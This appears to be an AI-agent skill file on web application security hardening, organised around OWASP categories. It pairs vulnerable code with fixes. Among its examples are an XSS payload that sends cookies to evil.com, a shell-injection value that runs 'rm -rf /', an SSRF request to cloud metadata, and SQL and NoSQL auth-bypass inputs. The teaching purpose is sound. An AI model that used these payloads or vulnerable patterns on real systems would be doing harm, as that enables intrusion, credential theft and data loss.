---
name: skill-security-hardening
description: Application-level security hardening — OWASP Top 10, injection prevention (SQL/XSS/NoSQL/Command/SSRF), IDOR prevention, CSRF protection, mass assignment, input validation, file upload security, dependency scanning, ReDoS, JWT asymmetric keys (RS256/JWKS), và security checklist cho mỗi PR.
---

# Skill: Security Hardening

## OWASP Top 10 (2021) — Practical Prevention

---

## A01 — Broken Access Control

### IDOR (Insecure Direct Object Reference)

```yaml
attack: "User A gửi GET /api/orders/123 — order 123 thuộc User B → A xem được"
root_cause: "Server check role nhưng KHÔNG check ownership"
severity: CRITICAL
```

```typescript
// ❌ VULNERABLE — chỉ check auth, không check ownership
@Get(':id')
@UseGuards(JwtAuthGuard)
async getOrder(@Param('id') id: string) {
  return this.orderService.findById(id) // bất kỳ user nào cũng xem được
}

// ✅ SAFE — check ownership
@Get(':id')
@UseGuards(JwtAuthGuard)
async getOrder(@Param('id') id: string, @CurrentUser() user: AuthUser) {
  const order = await this.orderService.findById(id)
  if (!order) throw new NotFoundException()

  // Owner check: order phải thuộc user hiện tại (hoặc admin)
  if (order.userId !== user.id && !user.roles.includes('admin')) {
    throw new ForbiddenException()
  }

  return order
}

// ✅ BETTER — filter ở query level (impossible to leak)
@Get(':id')
@UseGuards(JwtAuthGuard)
async getOrder(@Param('id') id: string, @CurrentUser() user: AuthUser) {
  const order = await this.prisma.order.findFirst({
    where: {
      id,
      ...(user.roles.includes('admin') ? {} : { userId: user.id }),
    },
  })
  if (!order) throw new NotFoundException()
  return order
}
```

```python
# ✅ Django — filter by owner
def get_order(request, order_id):
    order = get_object_or_404(
        Order.objects.filter(user=request.user),  # scoped to user
        pk=order_id
    )
    return JsonResponse(OrderSerializer(order).data)
```

### Horizontal Privilege Escalation Checklist

```yaml
every_endpoint_must_check:
  GET_single: "Tài nguyên thuộc user hiện tại? (hoặc admin)"
  GET_list: "Filter theo userId/tenantId"
  PUT_PATCH: "User sở hữu tài nguyên này?"
  DELETE: "User có quyền xoá tài nguyên này?"

patterns:
  uuid_over_sequential: "Dùng UUID thay auto-increment ID → harder to guess"
  query_scoping: "WHERE user_id = :currentUserId trong MỌI query"
  middleware: "Tạo ownership guard reusable"
```

```typescript
// Reusable ownership guard — NestJS
@Injectable()
export class OwnershipGuard implements CanActivate {
  constructor(private reflector: Reflector) {}

  async canActivate(context: ExecutionContext): Promise<boolean> {
    const resourceConfig = this.reflector.get<{
      model: string
      ownerField: string
    }>('ownership', context.getHandler())

    if (!resourceConfig) return true

    const request = context.switchToHttp().getRequest()
    const user = request.user
    const resourceId = request.params.id

    if (user.roles.includes('admin')) return true

    const resource = await this.prisma[resourceConfig.model].findUnique({
      where: { id: resourceId },
      select: { [resourceConfig.ownerField]: true },
    })

    return resource?.[resourceConfig.ownerField] === user.id
  }
}

// Usage
@Delete(':id')
@SetMetadata('ownership', { model: 'order', ownerField: 'userId' })
@UseGuards(JwtAuthGuard, OwnershipGuard)
async deleteOrder(@Param('id') id: string) { /* safe */ }
```

---

## A03 — Injection

### SQL Injection

```typescript
// ❌ VULNERABLE — string interpolation
const users = await db.query(`SELECT * FROM users WHERE email = '${email}'`)
// Attack: email = "' OR '1'='1' --"  → returns ALL users

// ✅ SAFE — parameterized query
const users = await db.query('SELECT * FROM users WHERE email = $1', [email])

// ✅ SAFE — ORM (Prisma, TypeORM, Sequelize) auto-parameterizes
const user = await prisma.user.findUnique({ where: { email } })

// ⚠️ DANGER ZONE — raw queries in ORM
// ❌ Still vulnerable if interpolating
await prisma.$queryRawUnsafe(`SELECT * FROM users WHERE name = '${name}'`)
// ✅ Use tagged template (auto-parameterized)
await prisma.$queryRaw`SELECT * FROM users WHERE name = ${name}`
```

### NoSQL Injection

```typescript
// ❌ VULNERABLE — MongoDB operator injection
app.post('/login', async (req, res) => {
  const user = await User.findOne({
    email: req.body.email,
    password: req.body.password,
  })
  // Attack: { "email": "admin@app.com", "password": { "$ne": "" } }
  // → password $ne "" = truthy → bypasses auth!
})

// ✅ SAFE — validate types, sanitize operators
import mongoSanitize from 'express-mongo-sanitize'
app.use(mongoSanitize()) // strips $ and . from req.body/query/params

// ✅ SAFE — explicit type casting
const email = String(req.body.email)
const password = String(req.body.password)
```

### XSS (Cross-Site Scripting)

```yaml
types:
  stored_xss: "Attacker stores script in DB → served to other users"
  reflected_xss: "Script in URL query param → reflected in response"
  dom_xss: "Client-side JS uses unsanitized input to modify DOM"
```

```typescript
// ❌ STORED XSS — user input rendered as HTML
// User submits: <img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
// Server stores in DB, serves to all users → cookie stolen

// ✅ PREVENTION — Server-side sanitization
import DOMPurify from 'isomorphic-dompurify'

function sanitizeHtml(dirty: string): string {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'li'],
    ALLOWED_ATTR: ['href'],
  })
}

// ✅ For plain text fields — strip ALL HTML
function sanitizeText(input: string): string {
  return input.replace(/[<>]/g, '') // simple but effective for non-HTML fields
}

// ✅ React auto-escapes by default (JSX)
<p>{userInput}</p>  // ✅ safe — React escapes HTML entities

// ❌ EXCEPT dangerouslySetInnerHTML
<div dangerouslySetInnerHTML={{ __html: userInput }} />  // ❌ XSS!
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />  // ✅

// ✅ Content-Security-Policy header (defense in depth)
// Blocks inline scripts even if XSS bypasses sanitization
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';
```

### Command Injection

```typescript
// ❌ VULNERABLE — user input in shell command
import { exec } from 'child_process'
app.get('/ping', (req, res) => {
  exec(`ping -c 1 ${req.query.host}`, (err, stdout) => res.send(stdout))
  // Attack: host = "google.com; rm -rf /"
})

// ✅ SAFE — use execFile (no shell interpretation)
import { execFile } from 'child_process'
execFile('ping', ['-c', '1', req.query.host], (err, stdout) => res.send(stdout))

// ✅ BETTER — validate input, never pass to shell
const HOST_REGEX = /^[a-zA-Z0-9.-]+$/
if (!HOST_REGEX.test(req.query.host)) throw new BadRequestException('Invalid host')
```

### SSRF (Server-Side Request Forgery)

```yaml
attack: "User provides URL → server fetches it → accesses internal services"
example: "POST /api/import { url: 'http://169.254.169.254/latest/meta-data/' }"
result: "Server fetches AWS metadata → leaks IAM credentials"
```

```typescript
// ❌ VULNERABLE
app.post('/fetch-url', async (req, res) => {
  const response = await fetch(req.body.url)  // user controls URL!
  res.json(await response.json())
})

// ✅ SAFE — validate and restrict URLs
import { URL } from 'url'
import dns from 'dns/promises'

async function validateExternalUrl(urlString: string): Promise<URL> {
  const url = new URL(urlString)

  // Block non-HTTP protocols
  if (!['http:', 'https:'].includes(url.protocol)) {
    throw new BadRequestException('Only HTTP(S) URLs allowed')
  }

  // Block internal hostnames
  const blockedHosts = ['localhost', '127.0.0.1', '0.0.0.0', '169.254.169.254', '[::1]']
  if (blockedHosts.some(h => url.hostname.includes(h))) {
    throw new BadRequestException('Internal URLs not allowed')
  }

  // DNS resolution check — block private IPs
  const addresses = await dns.resolve4(url.hostname)
  for (const addr of addresses) {
    if (isPrivateIP(addr)) {
      throw new BadRequestException('URL resolves to private IP')
    }
  }

  return url
}

function isPrivateIP(ip: string): boolean {
  const parts = ip.split('.').map(Number)
  return (
    parts[0] === 10 ||
    (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) ||
    (parts[0] === 192 && parts[1] === 168) ||
    parts[0] === 127 ||
    (parts[0] === 169 && parts[1] === 254)
  )
}

// ✅ Also: use allowlist for known external services
const ALLOWED_DOMAINS = ['api.github.com', 'api.stripe.com']
if (!ALLOWED_DOMAINS.some(d => url.hostname.endsWith(d))) {
  throw new BadRequestException('Domain not allowed')
}
```

---

## A05 — Mass Assignment

```yaml
attack: "POST /api/users { name: 'John', role: 'admin' } → user sets own role"
root_cause: "Spread req.body directly into DB create/update"
```

```typescript
// ❌ VULNERABLE — mass assignment
@Post()
async createUser(@Body() body: any) {
  return this.prisma.user.create({ data: body }) // body could contain role, isAdmin, etc.
}

// ✅ SAFE — DTO whitelist (class-validator + class-transformer)
class CreateUserDto {
  @IsEmail()
  email: string

  @IsString()
  @MinLength(2)
  name: string

  @IsString()
  @MinLength(8)
  password: string

  // role is NOT here → cannot be set by user
}

@Post()
async createUser(@Body() dto: CreateUserDto) {
  return this.prisma.user.create({
    data: {
      email: dto.email,
      name: dto.name,
      password: await hash(dto.password),
      role: 'member', // server sets default, not user
    },
  })
}

// ✅ For updates — explicit field pick
@Patch(':id')
async updateUser(@Param('id') id: string, @Body() dto: UpdateUserDto) {
  const allowedFields = pick(dto, ['name', 'avatar', 'bio']) // only these fields
  return this.prisma.user.update({ where: { id }, data: allowedFields })
}
```

```python
# ✅ Django REST Framework — explicit fields
class UserSerializer(serializers.ModelSerializer):
    class Meta:
        model = User
        fields = ['email', 'name']  # only these accepted
        read_only_fields = ['role', 'is_admin', 'is_active']
```

---

## Input Validation

### Validation Library Patterns

```typescript
// ✅ Zod (TypeScript-first, runtime validation)
import { z } from 'zod'

const CreateOrderSchema = z.object({
  items: z.array(z.object({
    productId: z.string().uuid(),
    quantity: z.number().int().min(1).max(100),
  })).min(1).max(50),
  shippingAddress: z.object({
    street: z.string().min(1).max(200),
    city: z.string().min(1).max(100),
    zipCode: z.string().regex(/^\d{5}(-\d{4})?$/),
    country: z.string().length(2), // ISO country code
  }),
  couponCode: z.string().max(20).optional(),
  // NO role, NO userId — server derives these
})

type CreateOrderDto = z.infer<typeof CreateOrderSchema>

// Usage
app.post('/orders', (req, res) => {
  const result = CreateOrderSchema.safeParse(req.body)
  if (!result.success) {
    return res.status(400).json({ errors: result.error.flatten() })
  }
  // result.data is typed and validated
  orderService.create(result.data, req.user.id)
})
```

### Validation Rules

```yaml
strings:
  - "Max length on ALL string fields (prevent DB overflow)"
  - "Trim whitespace"
  - "Regex for structured data (email, phone, zip)"
  - "Sanitize HTML if field accepts rich text"
  - "Reject null bytes: \\x00"

numbers:
  - "Type check (reject '123abc')"
  - "Min/max bounds"
  - "Integer check where needed (no 0.5 items)"

arrays:
  - "Max length (prevent 10K items in cart)"
  - "Validate each element"

ids:
  - "UUID format validation"
  - "NEVER trust client-supplied IDs for ownership (verify server-side)"

files:
  - "Max file size"
  - "Allowed MIME types (check magic bytes, not just extension)"
  - "Rename file (never use original filename in path)"
  - "Scan for malware if possible"

urls:
  - "Validate protocol (https only)"
  - "Check against SSRF (no internal IPs)"
  - "Max length"
```

---

## CSRF Protection

```typescript
// ✅ SameSite cookies (primary defense)
res.cookie('session', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',  // or 'lax' for GET-navigable links
})

// ✅ CSRF token (defense in depth for older browsers)
import csrf from 'csurf'
const csrfProtection = csrf({ cookie: true })

app.get('/form', csrfProtection, (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() })
})

app.post('/transfer', csrfProtection, (req, res) => {
  // csurf validates token automatically
})

// ✅ For SPAs with JWT: CSRF is less relevant IF
//    - Token in Authorization header (not cookie)
//    - API doesn't use cookie-based auth
// BUT if using cookie-based auth → CSRF token required

// ✅ Double Submit Cookie pattern (stateless CSRF)
// 1. Set CSRF token in cookie + response body
// 2. Client sends token in header: X-CSRF-Token
// 3. Server compares cookie value vs header value
```

---

## File Upload Security

```typescript
import fileType from 'file-type'
import path from 'path'

const ALLOWED_TYPES = new Map([
  ['image/jpeg', ['.jpg', '.jpeg']],
  ['image/png', ['.png']],
  ['image/webp', ['.webp']],
  ['application/pdf', ['.pdf']],
])

const MAX_FILE_SIZE = 10 * 1024 * 1024 // 10MB

async function validateUpload(file: Express.Multer.File) {
  // 1. Size check
  if (file.size > MAX_FILE_SIZE) {
    throw new BadRequestException('File too large (max 10MB)')
  }

  // 2. MIME type from magic bytes (NOT from Content-Type header — spoofable)
  const type = await fileType.fromBuffer(file.buffer)
  if (!type || !ALLOWED_TYPES.has(type.mime)) {
    throw new BadRequestException(`File type not allowed: ${type?.mime ?? 'unknown'}`)
  }

  // 3. Extension check
  const ext = path.extname(file.originalname).toLowerCase()
  if (!ALLOWED_TYPES.get(type.mime)?.includes(ext)) {
    throw new BadRequestException('File extension mismatch')
  }

  // 4. Rename file — NEVER use original filename
  const safeFilename = `${crypto.randomUUID()}${ext}`

  // 5. Store outside web root (or in S3)
  // NEVER: /public/uploads/user-provided-name.jpg
  // ✅: S3 bucket with presigned URLs

  return { safeFilename, mime: type.mime, size: file.size }
}
```

---

## ReDoS Prevention

```yaml
attack: "Evil regex input causes exponential backtracking → server hangs"
example:
  regex: "/^(a+)+$/"
  input: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"
  result: "CPU 100% for minutes"
```

```typescript
// ❌ VULNERABLE patterns (catastrophic backtracking)
/^(a+)+$/          // nested quantifiers
/(a|a)*$/          // overlapping alternatives
/^(a+)*b$/         // nested quantifiers
/(.*a){20}/        // quantified groups with wildcards

// ✅ SAFE patterns
/^a+$/             // no nesting
/^[a-z]{1,100}$/   // bounded, no backtracking

// ✅ Use safe-regex library to detect vulnerable patterns
import safeRegex from 'safe-regex'
if (!safeRegex(pattern)) throw new Error('Potentially unsafe regex')

// ✅ Set regex timeout (Node.js 20+)
const result = input.match(regex) // consider using RE2 library for untrusted patterns

// ✅ RE2 — Google's safe regex engine (no backtracking)
import RE2 from 're2'
const re = new RE2(userPattern) // linear time guarantee
```

---

## JWT Asymmetric Keys (RS256/ES256 + JWKS)

```typescript
// ❌ Symmetric (HMAC) — shared secret, less secure for distributed systems
jwt.sign(payload, 'shared-secret-string')
// If secret leaks → anyone can forge tokens

// ✅ Asymmetric (RS256) — private key signs, public key verifies
import { generateKeyPairSync } from 'crypto'

// Generate key pair (once, store securely)
const { publicKey, privateKey } = generateKeyPairSync('rsa', {
  modulusLength: 2048,
  publicKeyEncoding: { type: 'spki', format: 'pem' },
  privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
})

// Sign (auth service only — has private key)
const token = jwt.sign(payload, privateKey, {
  algorithm: 'RS256',
  expiresIn: '15m',
  issuer: 'auth.myapp.com',
  keyid: 'key-2026-01', // for JWKS rotation
})

// Verify (any service — only needs public key)
const decoded = jwt.verify(token, publicKey, {
  algorithms: ['RS256'], // ✅ MUST restrict algorithm — prevents "alg:none" attack
  issuer: 'auth.myapp.com',
})

// ✅ JWKS endpoint — distribute public keys
// GET https://auth.myapp.com/.well-known/jwks.json
{
  "keys": [{
    "kty": "RSA",
    "kid": "key-2026-01",
    "use": "sig",
    "alg": "RS256",
    "n": "...",    // modulus (public)
    "e": "AQAB"   // exponent (public)
  }]
}

// ✅ Key rotation without downtime
// 1. Generate new key pair
// 2. Add new public key to JWKS (both old + new)
// 3. Start signing with new private key
// 4. After old tokens expire → remove old public key from JWKS
```

```typescript
// ✅ Algorithm confusion attack prevention
// Attack: attacker changes "alg" from RS256 to HS256, uses PUBLIC KEY as HMAC secret
// Prevention: ALWAYS specify allowed algorithms in verify()
jwt.verify(token, publicKey, {
  algorithms: ['RS256'], // NEVER allow HS256 when using asymmetric
})
```

---

## Dependency Security

```yaml
scanning:
  npm_audit: "npm audit --production (run in CI)"
  snyk: "snyk test (deeper analysis, exploitability)"
  dependabot: "GitHub Dependabot auto-PRs for vulnerable deps"
  socket: "socket.dev (supply chain attack detection)"

ci_integration: |
  # .github/workflows/security.yml
  - name: Audit dependencies
    run: npm audit --audit-level=high
    # Fail CI if high/critical vulnerabilities found

  - name: Check for known vulnerabilities
    uses: snyk/actions/node@master
    env:
      SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}

lockfile:
  - "ALWAYS commit package-lock.json / yarn.lock / pnpm-lock.yaml"
  - "npm ci in CI (not npm install — respects lockfile exactly)"
  - "Review lockfile changes in PRs"

best_practices:
  - "Update dependencies regularly (weekly/monthly)"
  - "Pin major versions: ^1.0.0 not * "
  - "Minimal dependencies — every dep is attack surface"
  - "Audit transitive deps (dep of dep)"

secret_scanning: |
  # Pre-commit hook — detect secrets before commit
  # tools: gitleaks, truffleHog, detect-secrets
  # .pre-commit-config.yaml
  - repo: https://github.com/gitleaks/gitleaks
    hooks:
      - id: gitleaks
```

---

## Security Checklist (Per PR)

```yaml
pr_security_review:
  authentication:
    - "[ ] Mọi endpoint mới có auth guard?"
    - "[ ] Endpoint public là intentional?"

  authorization:
    - "[ ] Server-side permission check (không chỉ frontend)?"
    - "[ ] IDOR check: query scoped to current user/tenant?"
    - "[ ] Admin endpoints có admin guard?"

  input:
    - "[ ] Request body validated (DTO/Zod schema)?"
    - "[ ] String fields có max length?"
    - "[ ] Không spread req.body trực tiếp vào DB?"
    - "[ ] File uploads validated (size, type, renamed)?"

  injection:
    - "[ ] Không có string interpolation trong SQL/NoSQL queries?"
    - "[ ] User input không passed vào shell commands?"
    - "[ ] URLs from user validated (SSRF check)?"
    - "[ ] Rich text sanitized (DOMPurify)?"

  data:
    - "[ ] Sensitive data không log (passwords, tokens, PII)?"
    - "[ ] Error responses không leak internal details?"
    - "[ ] PII encrypted at rest nếu cần?"

  dependencies:
    - "[ ] New dependencies justified (không thêm random packages)?"
    - "[ ] npm audit clean?"

  headers:
    - "[ ] CORS không wildcard?"
    - "[ ] Security headers present (CSP, HSTS, X-Frame-Options)?"
```

---

## Anti-patterns

```yaml
trust_client_input:
  bad: "req.body is already validated by React form"
  fix: "Client validation = UX. Server validation = security. ALWAYS both."

error_message_leak:
  bad: 'res.status(500).json({ error: err.stack })'
  fix: 'res.status(500).json({ error: "Internal server error", requestId })'

admin_without_guard:
  bad: "Admin panel at /admin — hidden but no auth check on API"
  fix: "Every admin API endpoint has admin role guard"

single_layer_defense:
  bad: "We have WAF so we don't need input validation"
  fix: "Defense in depth: WAF + input validation + parameterized queries + CSP"

security_as_afterthought:
  bad: "Build feature first, add security later"
  fix: "Security in every PR checklist, every code review"
```
